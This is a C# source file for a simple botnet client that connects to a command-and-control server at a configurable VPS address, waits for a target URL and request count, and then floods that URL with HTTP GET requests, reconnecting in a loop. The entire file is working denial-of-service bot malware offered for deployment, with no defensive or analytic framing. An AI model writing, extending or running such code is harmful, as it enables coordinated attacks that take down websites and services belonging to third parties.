using System;
using System.Text;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading;

namespace Marlborge_Client
{
    class Program
    {
        static TcpClient tcpClient = new TcpClient();
        static IPAddress ip = IPAddress.Parse("127.0.0.1"); // Set your VPS IP Address
        static int port = 3000; // Set the port of your socket

        static void Main(string[] args)
        {
            Connect();
        }

        static void Connect()
        {
            try
            {
                tcpClient.Connect(ip, port);
                Console.WriteLine("Connected!");
                Listen();
            } catch (Exception e)
            {
                Console.WriteLine("Failed to connect, trying again...");
                Thread.Sleep(60000); // 60 second sleep
                Connect();
            }
        }

        static void Listen()
        {
            try
            {
                Console.WriteLine("Listening!");
                byte[] buffer = new Byte[2048];
                NetworkStream networkStream = tcpClient.GetStream();
                int data = networkStream.Read(buffer, 0, buffer.Length);
                string dataStr = Encoding.ASCII.GetString(buffer, 0, data);
                string[] parsedData = dataStr.Split(",");
                string url = parsedData[0];
                int quantity = int.Parse(parsedData[1]);

                if (url.StartsWith("https") || url.StartsWith("http"))
                {
                    DoS(url, quantity);
                } else
                {
                    Console.WriteLine("Invalid URL given! Restarting client...");
                    Restart();
                }
            } catch (Exception e)
            {
                Console.WriteLine("Failed to listen. Restarting client...");
                Restart();
            }
        }


        static void DoS(string url, int quantity)
        {
            HttpClient client = new HttpClient();
            Console.WriteLine("Attacking the requested URL");
            for (int i = 0; i < quantity; i++)
            {
                client.GetAsync(url);
            }
            Console.WriteLine("Attack finished, restarting connection...");
            Restart();
        }

        static void Restart()
        {
            tcpClient.Close();
            tcpClient = null;
            tcpClient = new TcpClient();
            Console.WriteLine("Restarted, reconnecting...");
            Thread.Sleep(60000); // 60 second sleep
            Connect();
        }
    }
}
